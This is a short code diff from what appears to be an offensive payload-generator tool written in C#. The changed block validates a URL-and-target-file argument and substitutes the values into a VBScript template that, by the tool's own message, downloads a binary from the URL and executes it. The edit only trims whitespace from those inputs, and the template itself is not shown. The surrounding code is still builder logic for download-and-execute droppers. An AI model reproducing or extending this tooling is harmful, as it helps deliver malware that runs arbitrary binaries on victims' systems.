@@ -954,18 +954,18 @@ EXAMPLES:
                     if (entry.Value.Contains(","))
                     {
                         string[] foo = entry.Value.Split(',');
-                        if (foo.Length != 2 || foo[1].Length < 1)
+                        if (foo.Length != 2 || foo[1].Trim().Length < 1)
                         {
                             Console.WriteLine("[!] Error: URL must be in form: url=URL,TargetFile");
                             System.Environment.Exit(1);
                         }
 
                         Console.WriteLine("[*] Using VBScript that downloads a binary file from URL to DST and executes it.");
-                        payload = TemplateVBSDownloadAndExec.Replace("DOWNLOAD_URL", foo[0]);
-                        payload = payload.Replace("TARGET_FILE", foo[1]);
+                        payload = TemplateVBSDownloadAndExec.Replace("DOWNLOAD_URL", foo[0].Trim());
+                        payload = payload.Replace("TARGET_FILE", foo[1].Trim());
 
-                        Console.WriteLine("[*] Will download from   : " + foo[0]);
-                        Console.WriteLine("[*] And store the file at: " + foo[1]);
+                        Console.WriteLine("[*] Will download from   : " + foo[0].Trim());
+                        Console.WriteLine("[*] And store the file at: " + foo[1].Trim());
                     }
                     else
                     {
